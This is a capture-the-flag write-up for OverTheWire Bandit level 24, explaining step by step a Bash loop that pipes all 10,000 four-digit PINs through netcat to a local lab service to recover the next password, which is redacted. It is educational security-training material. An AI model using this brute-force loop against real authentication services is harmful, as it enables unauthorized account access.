# Bandit Level 24 → Level 25

## Challenge Information

- **Platform:** OverTheWire Bandit
- **Category:** Linux, Bash Scripting, Brute Force, Network Services
- **Difficulty:** Beginner
- **Tools Used:** `nc`, `nano`, `chmod`, `seq`, `grep`, `ssh`
- **Objective:** Find the correct four-digit PIN by submitting all possible PINs alongside the current password to the local PIN-checking service.

## 1. Challenge Description

The service listens on `localhost` port `30002`. It requires two values on a single line, separated by a space:

1. The current password for `bandit24`.
2. A four-digit secret PIN ranging from `0000` to `9999`.

The goal is to find the correct PIN and retrieve the password for `bandit25`.

## 2. Connecting to the Service

I connected to the service using Netcat:

```bash
nc localhost 30002
```

The service prompted me to enter the current password and secret PIN on one line.

I tested a sample PIN:

```text
[bandit24 password] 1234
```

The service returned an incorrect PIN message. Testing every PIN manually would be inefficient, so I decided to automate the process with a Bash script.

## 3. Creating the Brute-Force Script

I created a script in `/tmp`:

```bash
nano brute.sh
```

I added the following code:

```bash
#!/bin/bash

password="[BANDIT24_PASSWORD]"

for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done | nc localhost 30002 | grep -v "Wrong"
```

Replace `[BANDIT24_PASSWORD]` with the actual password for `bandit24` when running the script. The placeholder is used here to avoid publishing credentials.

### Understanding the script

**Step 1: Store the current password**

```bash
password="[BANDIT24_PASSWORD]"
```

The variable stores the password required by the service.

**Step 2: Generate every four-digit PIN**

```bash
seq -w 0000 9999
```

`seq` generates numbers from `0000` through `9999`. The `-w` option pads numbers with leading zeros so each PIN has four digits.

For example:

```text
0000
0001
0002
...
9998
9999
```

There are 10,000 possible PINs.

**Step 3: Combine the password and each PIN**

```bash
for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done
```

The loop generates one line for each PIN, with the password and PIN separated by a space.

**Step 4: Send the candidates to the service**

```bash
nc localhost 30002
```

The pipe sends all generated lines to Netcat, which submits them to the service.

**Step 5: Filter the response**

```bash
grep -v "Wrong"
```

The `-v` option excludes lines containing `Wrong`, helping reveal the successful response while filtering out incorrect attempts.

## 4. Making the Script Executable

I gave the script execute permission:

```bash
chmod +x brute.sh
```

Then I ran it:

```bash
./brute.sh
```

The service checked the candidate PINs and eventually returned:

```text
Correct!
The password of user bandit25 is [REDACTED]
```

The actual password is intentionally omitted from this write-up.

## 5. Logging In to bandit25

After retrieving the password, I exited the `bandit24` session and connected to the next account:

```bash
ssh -p 2220 bandit25@bandit.labs.overthewire.org
```

I entered the retrieved password when prompted and successfully logged in.

## 6. Key Learnings

- **Netcat (`nc`):** Connects to network services and sends or receives data.
- **Brute force:** Tests possible values systematically until the correct one is found.
- **Bash loops:** Automate repeated operations.
- **`seq -w`:** Generates a numeric sequence while preserving a consistent digit width.
- **Pipes (`|`):** Send one command's output to another command as input.
- **`grep -v`:** Filters out lines matching a pattern.
- **`chmod +x`:** Makes a script executable.
- **Automation:** A short script can replace thousands of repetitive manual attempts.

## 7. References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
- [`nc` manual](https://man.openbsd.org/nc.1)
- [`seq` documentation](https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html)
- [`grep` documentation](https://www.gnu.org/software/grep/manual/grep.html)
- [GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/)

**Security note:** This exercise demonstrates brute-force automation in an authorized lab. Use these techniques only on systems and services you have permission to test. Never publish actual passwords in a public repository.